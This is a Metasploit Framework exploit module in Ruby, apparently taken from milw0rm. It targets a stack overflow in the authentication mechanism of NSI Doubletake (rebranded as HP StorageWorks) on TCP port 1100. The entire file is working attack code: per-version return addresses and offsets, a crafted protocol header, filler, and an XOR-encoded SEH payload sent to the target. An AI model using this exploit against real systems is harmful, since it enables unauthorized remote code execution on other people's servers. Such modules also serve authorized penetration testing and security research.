##
# $Id: doubletake.rb 4529 2007-03-23 01:08:18Z $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Doubletake < Msf::Exploit::Remote
	include Exploit::Remote::Tcp
	include Exploit::Remote::Seh
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'doubletake Overflow',
			'Description'    => %q{
					This Module Exploits a stack overflow in the authentication mechanism of NSI Doubletake which is also rebranded
					as hp storage works Vulnerability found by Titon of Bastard Labs.
			},
			'Author'         => [ 'ri0t <ri0t[at]ri0tnet.net>' ],
			'Version'        => '$Revision: 9 $',
			'References'     => 
				[
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			
			'Targets'        =>
				[
					['doubletake 4.5.0',    { 'Ret' =>  0x006f5fa7, 'Offset' => 5544 } ],
					['doubletake 4.4.2', { 'Ret' => 0x0074e307, 'Offset' => 944 } ],  
					['doubletake 4.5.0.1819', { 'Ret' => 0x006e62dd, 'Offset' => 5544 } ],
				],
			 'DefaultTarget' => 0,

			'Privileged'     => false,

			'DisclosureDate' => ''

			))

			register_options(
			[
				Opt::RPORT(1100)
			], self.class)
	end

	def exploit
                xor = Rex::Encoding::Xor::Byte
		connect

		print_status("Trying target #{target.name}...")

                header = 
               "\x00\x02\x00\x01\x27\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x00\x00\x00\x00"+
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"+
               "\x00\x00\x00\x1e\x00\x00\x00\x01\x00\x01"

		filler =  rand_text_english(1) * (target['Offset'])
		seh = generate_seh_payload(target.ret)
                buffercoded= xor.encode(seh+payload.encoded, [0xf0].pack("C"))
		sploit =  header + filler + buffercoded[0]
		sock.put(sploit)
		handler
		disconnect	
	end

end
end

# milw0rm.com [2008-06-04]
